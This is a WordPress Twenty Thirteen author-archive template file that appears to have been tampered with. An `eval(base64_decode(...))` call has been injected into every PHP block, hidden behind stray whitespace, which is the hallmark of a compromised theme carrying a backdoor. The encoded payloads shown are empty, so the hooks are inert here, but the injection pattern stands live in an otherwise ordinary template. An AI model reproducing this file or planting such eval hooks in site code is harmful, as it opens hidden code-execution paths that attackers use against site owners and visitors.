<?php	 	eval(base64_decode(""));
/**
 * The template for displaying Author archive pages.
 *
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">

		<?php	 	eval(base64_decode("")); if ( have_posts() ) : ?>

			<?php	 	eval(base64_decode(""));
				/* Queue the first post, that way we know
				 * what author we're dealing with (if that is the case).
				 *
				 * We reset this later so we can run the loop
				 * properly with a call to rewind_posts().
				 */
				the_post();
			?>

			<header class="archive-header">
				<h1 class="archive-title"><?php	 	eval(base64_decode("")); printf( __( 'All posts by %s', 'twentythirteen' ), '<span class="vcard"><a class="url fn n" href="' . esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ) . '" title="' . esc_attr( get_the_author() ) . '" rel="me">' . get_the_author() . '</a></span>' ); ?></h1>
			</header><!-- .archive-header -->

			<?php	 	eval(base64_decode(""));
				/* Since we called the_post() above, we need to
				 * rewind the loop back to the beginning that way
				 * we can run the loop properly, in full.
				 */
				rewind_posts();
			?>

			<?php	 	eval(base64_decode("")); if ( get_the_author_meta( 'description' ) ) : ?>
				<?php	 	eval(base64_decode("")); get_template_part( 'author-bio' ); ?>
			<?php	 	eval(base64_decode("")); endif; ?>

			<?php	 	eval(base64_decode("")); /* The loop */ ?>
			<?php	 	eval(base64_decode("")); while ( have_posts() ) : the_post(); ?>
				<?php	 	eval(base64_decode("")); get_template_part( 'content', get_post_format() ); ?>
			<?php	 	eval(base64_decode("")); endwhile; ?>

			<?php	 	eval(base64_decode("")); twentythirteen_paging_nav(); ?>

		<?php	 	eval(base64_decode("")); else : ?>
			<?php	 	eval(base64_decode("")); get_template_part( 'content', 'none' ); ?>
		<?php	 	eval(base64_decode("")); endif; ?>

		</div><!-- #content -->
	</div><!-- #primary -->

<?php	 	eval(base64_decode("")); get_sidebar(); ?>
<?php	 	eval(base64_decode("")); get_footer(); ?>